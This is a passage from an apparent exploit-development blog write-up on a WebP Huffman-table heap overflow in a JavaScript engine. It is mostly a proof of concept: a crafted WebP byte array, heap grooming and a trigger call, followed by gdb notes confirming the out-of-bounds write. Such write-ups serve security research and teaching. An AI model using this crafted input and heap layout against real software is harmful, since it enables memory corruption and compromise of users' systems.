</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">webp</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uint8Array</span><span class="p">([</span><span class="mi">82</span><span class="p">,</span> <span class="mi">73</span><span class="p">,</span> <span class="mi">70</span><span class="p">,</span> <span class="mi">70</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">69</span><span class="p">,</span> <span class="mi">66</span><span class="p">,</span> <span class="mi">80</span><span class="p">,</span> <span class="mi">86</span><span class="p">,</span> <span class="mi">80</span><span class="p">,</span> <span class="mi">56</span><span class="p">,</span> <span class="mi">76</span><span class="p">,</span> <span class="mi">123</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">26</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">130</span><span class="p">,</span> <span class="mi">36</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">146</span><span class="p">,</span> <span class="mi">36</span><span class="p">,</span> <span class="mi">73</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">86</span><span class="p">,</span> <span class="mi">207</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">157</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">65</span><span class="p">,</span> <span class="mi">146</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">73</span><span class="p">,</span> <span class="mi">146</span><span class="p">,</span> <span class="mi">36</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">179</span><span class="p">,</span> <span class="mi">122</span><span class="p">,</span> <span class="mi">118</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">247</span><span class="p">,</span> <span class="mi">206</span><span class="p">,</span> <span class="mi">131</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">73</span><span class="p">,</span> <span class="mi">130</span><span class="p">,</span> <span class="mi">36</span><span class="p">,</span> <span class="mi">73</span><span class="p">,</span> <span class="mi">146</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">89</span><span class="p">,</span> <span class="mi">61</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">123</span><span class="p">,</span> <span class="mi">231</span><span class="p">,</span> <span class="mi">65</span><span class="p">,</span> <span class="mi">144</span><span class="p">,</span> <span class="mi">36</span><span class="p">,</span> <span class="mi">65</span><span class="p">,</span> <span class="mi">146</span><span class="p">,</span> <span class="mi">36</span><span class="p">,</span> <span class="mi">73</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">140</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">172</span><span class="p">,</span> <span class="mi">158</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">189</span><span class="p">,</span> <span class="mi">243</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">146</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">73</span><span class="p">,</span> <span class="mi">146</span><span class="p">,</span> <span class="mi">36</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">185</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">71</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">86</span><span class="p">,</span> <span class="mi">207</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">255</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">x</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">y</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">500</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">x</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mh">0x2fb0</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="nx">y</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="k">new</span> <span class="nb">Array</span><span class="p">(</span><span class="mf">1.1</span><span class="p">,</span> <span class="mf">2.2</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Free some of it
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">250</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">500</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">x</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="kc">undefined</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Try to trigger overflow
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">isWebP</span><span class="p">(</span><span class="nx">webp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nb">Math</span><span class="p">.</span><span class="nx">min</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>To debug easier, I used a technique from this <a href="https://mem2019.github.io/jekyll/update/2021/09/27/TCTF2021-Promise.html" target="_blank" rel="noopener noreffer ">blog</a>. The trick involves setting a breakpoint at <code>js_math_min_max</code>. Additionally, we&rsquo;ll set a breakpoint at <code>DecodeImageStream+935</code>, where <code>rax</code> holds the address of <code>huffman_tables</code>.</p>
<p>After running the aforementioned code and examining the state in <code>gdb</code> when breaking at <code>js_math_min_max</code>, we observe that it indeed overwrites <code>huffman_tables+0x3000</code> with the value <code>0x30007</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
